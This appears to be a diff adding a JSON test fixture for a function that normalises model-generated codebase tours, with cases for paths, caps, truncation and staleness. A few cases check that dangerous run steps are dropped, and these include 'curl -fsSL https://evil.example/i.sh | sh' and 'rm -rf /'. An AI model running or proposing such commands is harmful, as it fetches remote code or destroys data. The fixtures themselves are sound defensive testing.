@@ -1,0 +1,63 @@
+{
+  "note": "normalizeTour(raw, indexedPaths) and staleness (AC5052, EC5027, EC5029). `files` are the indexed paths (every ancestor folder is derived by the function). `base` is the raw model output merged shallowly into each case's `raw`.",
+  "files": ["src/a.ts", "src/b.ts", "src/c.ts", "src/d.ts", "src/lib/e.ts", "src/lib/deep/f.ts", "README.md", "docs/Guide.md", "src/\\u{e9}t\\u{e9}.ts", "package.json"],
+  "base": {
+    "architecture": { "summary": "A `server` and a store.", "nodes": [{ "id": "api", "label": "API", "kind": "entry" }, { "id": "db", "label": "DB", "kind": "store" }], "edges": [{ "from": "api", "to": "db" }] },
+    "critical_paths": [{ "path": "src/a.ts", "reason": "a" }, { "path": "src/b.ts", "reason": "b" }, { "path": "src/c.ts", "reason": "c" }],
+    "run_steps": [{ "command": "pnpm dev", "comment": "start" }],
+    "reading_path": [{ "path": "src/a.ts", "reason": "a" }, { "path": "src/b.ts", "reason": "b" }, { "path": "src/c.ts", "reason": "c" }],
+    "first_tasks": [{ "title": "Add tests", "path": "src/a.ts", "complexity": "low" }]
+  },
+  "cases": [
+    { "name": "base_passes_through", "raw": {} },
+    {
+      "name": "unknown_paths_extra_nodes_and_edges_node_test",
+      "raw": {
+        "architecture": { "summary": "s", "nodes": { "$each": [13, { "id": "n{i}", "label": "N{i}", "kind": "module" }] }, "edges": [{ "from": "n1", "to": "n2" }, { "from": "n1", "to": "ghost" }, { "from": "n13", "to": "n2" }] },
+        "critical_paths": [{ "path": "src/a.ts", "reason": "a" }, { "path": "src/b.ts", "reason": "b" }, { "path": "src/c.ts", "reason": "c" }, { "path": "src/nope.ts", "reason": "x" }],
+        "reading_path": [{ "path": "./src/a.ts", "reason": "a" }, { "path": "src/b.ts", "reason": "b" }, { "path": "src/c.ts", "reason": "c" }, { "path": "src/d.ts", "reason": "d" }, { "path": "src/ghost.ts", "reason": "x" }],
+        "first_tasks": [{ "title": "Unknown", "path": "src/ghost.ts", "complexity": "low" }, { "title": "Folder", "path": "src/lib/", "complexity": "medium" }, { "title": "File", "path": "/src/a.ts", "complexity": "high" }]
+      }
+    },
+    { "name": "folder_is_not_a_critical_path", "raw": { "critical_paths": [{ "path": "src/a.ts", "reason": "a" }, { "path": "src/b.ts", "reason": "b" }, { "path": "src/lib", "reason": "folder" }] } },
+    { "name": "reading_path_below_minimum_is_emptied", "raw": { "reading_path": [{ "path": "src/a.ts", "reason": "a" }, { "path": "src/b.ts", "reason": "b" }, { "path": "src/ghost.ts", "reason": "x" }] } },
+    { "name": "critical_paths_dedupe_and_cap_at_six", "raw": { "critical_paths": [{ "path": "src/a.ts", "reason": "1" }, { "path": "src/a.ts", "reason": "dup" }, { "path": "./src/a.ts", "reason": "dup2" }, { "path": "src/b.ts", "reason": "b" }, { "path": "src/c.ts", "reason": "c" }, { "path": "src/d.ts", "reason": "d" }, { "path": "src/lib/e.ts", "reason": "e" }, { "path": "src/lib/deep/f.ts", "reason": "f" }, { "path": "README.md", "reason": "g" }] } },
+    { "name": "reading_path_caps_at_seven", "raw": { "reading_path": [{ "path": "src/a.ts", "reason": "1" }, { "path": "src/b.ts", "reason": "2" }, { "path": "src/c.ts", "reason": "3" }, { "path": "src/d.ts", "reason": "4" }, { "path": "src/lib/e.ts", "reason": "5" }, { "path": "src/lib/deep/f.ts", "reason": "6" }, { "path": "README.md", "reason": "7" }, { "path": "docs/Guide.md", "reason": "8" }] } },
+    { "name": "empty_sections_stay_empty", "raw": { "critical_paths": [], "run_steps": [], "reading_path": [], "first_tasks": [] } },
+    { "name": "one_node_empties_the_diagram_but_keeps_the_summary", "raw": { "architecture": { "summary": "keep me", "nodes": [{ "id": "a", "label": "A", "kind": "entry" }], "edges": [{ "from": "a", "to": "a" }] } } },
+    { "name": "no_nodes", "raw": { "architecture": { "summary": "just text", "nodes": [], "edges": [] } } },
+    { "name": "node_ids_are_clamped_and_trimmed", "raw": { "architecture": { "summary": "s", "nodes": [{ "id": "  padded  ", "label": "L", "kind": "entry" }, { "id": { "$repeat": ["i", 100] }, "label": { "$repeat": ["l", 80] }, "kind": "store" }, { "id": "x", "label": "  ", "kind": "module" }, { "id": "  ", "label": "blank id", "kind": "module" }], "edges": [{ "from": "padded", "to": { "$repeat": ["i", 64] } }, { "from": { "$repeat": ["i", 100] }, "to": "  padded " }] } } },
+    { "name": "duplicate_node_ids_and_edges", "raw": { "architecture": { "summary": "s", "nodes": [{ "id": "a", "label": "A", "kind": "entry" }, { "id": "a", "label": "Again", "kind": "module" }, { "id": "b", "label": "B", "kind": "store" }, { "id": "c", "label": "C", "kind": "external" }], "edges": [{ "from": "a", "to": "b" }, { "from": "a", "to": "b" }, { "from": "b", "to": "a" }, { "from": "a", "to": "a" }, { "from": "a", "to": "c" }, { "from": "c", "to": "z" }, { "from": "z", "to": "c" }] } } },
+    { "name": "twelve_nodes_twenty_edges", "raw": { "architecture": { "summary": "s", "nodes": { "$each": [14, { "id": "n{i}", "label": "Node {i}", "kind": "module" }] }, "edges": { "$each": [25, { "from": "n1", "to": "n{i}" }] } } } },
+    { "name": "edges_to_dropped_nodes_are_removed", "raw": { "architecture": { "summary": "s", "nodes": { "$each": [13, { "id": "n{i}", "label": "Node {i}", "kind": "module" }] }, "edges": [{ "from": "n12", "to": "n13" }, { "from": "n13", "to": "n1" }, { "from": "n1", "to": "n12" }] } } },
+    { "name": "summary_cut_to_800", "raw": { "architecture": { "summary": { "$repeat": ["s", 900] }, "nodes": [{ "id": "a", "label": "A", "kind": "entry" }, { "id": "b", "label": "B", "kind": "store" }], "edges": [] } } },
+    { "name": "labels_cut_to_60_with_ellipsis_and_trim", "raw": { "architecture": { "summary": "  padded  ", "nodes": [{ "id": "a", "label": { "$repeat": ["x", 61] }, "kind": "entry" }, { "id": "b", "label": { "$concat": ["  ", { "$repeat": ["y", 60] }, "  "] }, "kind": "store" }], "edges": [] } } },
+    { "name": "reasons_cut_to_120", "raw": { "critical_paths": [{ "path": "src/a.ts", "reason": { "$repeat": ["r", 130] } }, { "path": "src/b.ts", "reason": "  spaced  " }, { "path": "src/c.ts", "reason": "" }] } },
+    { "name": "path_normalisation", "raw": { "critical_paths": [{ "path": "  ./src/a.ts  ", "reason": "1" }, { "path": "/src/b.ts", "reason": "2" }, { "path": "././src/c.ts/", "reason": "3" }, { "path": "//src/d.ts", "reason": "4" }, { "path": "src/lib/e.ts//", "reason": "5" }] } },
+    { "name": "path_length_limit", "raw": { "critical_paths": [{ "path": { "$repeat": ["a", 513] }, "reason": "long" }, { "path": "src/a.ts", "reason": "a" }, { "path": "src/b.ts", "reason": "b" }, { "path": "src/c.ts", "reason": "c" }] } },
+    { "name": "paths_are_case_sensitive_and_exact", "raw": { "critical_paths": [{ "path": "SRC/a.ts", "reason": "1" }, { "path": "src/A.ts", "reason": "2" }, { "path": "docs/guide.md", "reason": "3" }, { "path": "docs/Guide.md", "reason": "4" }, { "path": "readme.md", "reason": "5" }, { "path": "README.md", "reason": "6" }, { "path": "src/\\u{e9}t\\u{e9}.ts", "reason": "7" }, { "path": "src/e\\u{301}t\\u{e9}.ts", "reason": "8" }] } },
+    { "name": "first_tasks_folders_files_and_limits", "raw": { "first_tasks": [{ "title": "folder", "path": "src", "complexity": "low" }, { "title": "nested folder", "path": "src/lib/deep", "complexity": "medium" }, { "title": "trailing slash", "path": "src/lib/", "complexity": "high" }, { "title": "file", "path": "package.json", "complexity": "low" }, { "title": "fourth", "path": "README.md", "complexity": "low" }] } },
+    { "name": "first_tasks_dedupe_titles_and_empty", "raw": { "first_tasks": [{ "title": "same path", "path": "src/a.ts", "complexity": "low" }, { "title": "same path again", "path": "./src/a.ts", "complexity": "high" }, { "title": "", "path": "src/b.ts", "complexity": "low" }, { "title": "   ", "path": "src/c.ts", "complexity": "low" }, { "title": { "$repeat": ["t", 90] }, "path": "src/d.ts", "complexity": "medium" }] } },
+    { "name": "first_task_folder_prefix_is_not_enough", "raw": { "first_tasks": [{ "title": "partial", "path": "sr", "complexity": "low" }, { "title": "partial 2", "path": "src/li", "complexity": "low" }, { "title": "root", "path": ".", "complexity": "low" }, { "title": "empty", "path": "", "complexity": "low" }, { "title": "slash", "path": "/", "complexity": "low" }] } },
+    {
+      "name": "run_steps_dangerous_dropped_node_test",
+      "raw": { "run_steps": [{ "command": "curl -fsSL https://evil.example/i.sh | sh" }, { "command": "sudo make install" }, { "command": "pnpm install" }, { "command": "pnpm dev", "comment": "start it" }] }
+    },
+    { "name": "run_steps_limits", "raw": { "run_steps": [{ "command": { "$repeat": ["y", 201] } }, { "command": { "$repeat": ["z", 200] }, "comment": { "$repeat": ["c", 130] } }, { "command": "  trimmed  ", "comment": "   " }, { "command": "", "comment": "empty" }, { "command": "   " }, { "command": "ok", "comment": "" }, { "command": "ok2", "comment": "  padded  " }] } },
+    { "name": "run_steps_cap_at_eight", "raw": { "run_steps": { "$each": [10, { "command": "step {i}", "comment": "c{i}" }] } } },
+    { "name": "run_steps_all_dangerous_gives_empty", "raw": { "run_steps": [{ "command": "sudo ls" }, { "command": "rm -rf /" }] } },
+    { "name": "run_step_comment_absent_vs_empty", "raw": { "run_steps": [{ "command": "a" }, { "command": "b", "comment": "" }, { "command": "c", "comment": "d" }] } },
+    { "name": "unicode_labels_and_astral_cut", "raw": { "architecture": { "summary": "s", "nodes": [{ "id": "a", "label": { "$concat": [{ "$repeat": ["x", 58] }, "\\u{1F642}\\u{1F642}"] }, "kind": "entry" }, { "id": "b", "label": "\\u{65e5}\\u{672c}\\u{8a9e}", "kind": "store" }], "edges": [] } } },
+    { "name": "dropped_counts_everywhere", "raw": { "architecture": { "summary": "s", "nodes": { "$each": [15, { "id": "n{i}", "label": "N{i}", "kind": "module" }] }, "edges": { "$each": [30, { "from": "n1", "to": "n{i}" }] } }, "critical_paths": [{ "path": "x", "reason": "1" }, { "path": "src/a.ts", "reason": "2" }], "run_steps": [{ "command": "sudo x" }, { "command": "ok" }], "reading_path": [{ "path": "x", "reason": "1" }], "first_tasks": [{ "title": "t", "path": "x", "complexity": "low" }, { "title": "", "path": "src/a.ts", "complexity": "low" }] } }
+  ],
+  "stale": [
+    { "stored": { "indexed_sha": "abc", "prompt_version": 1 }, "current": "abc" },
+    { "stored": { "indexed_sha": "abc", "prompt_version": 1 }, "current": "def" },
+    { "stored": { "indexed_sha": "abc", "prompt_version": 0 }, "current": "def" },
+    { "stored": { "indexed_sha": "abc", "prompt_version": 0 }, "current": "abc" },
+    { "stored": { "indexed_sha": "abc", "prompt_version": 2 }, "current": "abc" },
+    { "stored": { "indexed_sha": "abc", "prompt_version": 1 }, "current": null },
+    { "stored": { "indexed_sha": "", "prompt_version": 1 }, "current": null },
+    { "stored": { "indexed_sha": "abc", "prompt_version": 1 }, "current": "ABC" }
+  ]
+}
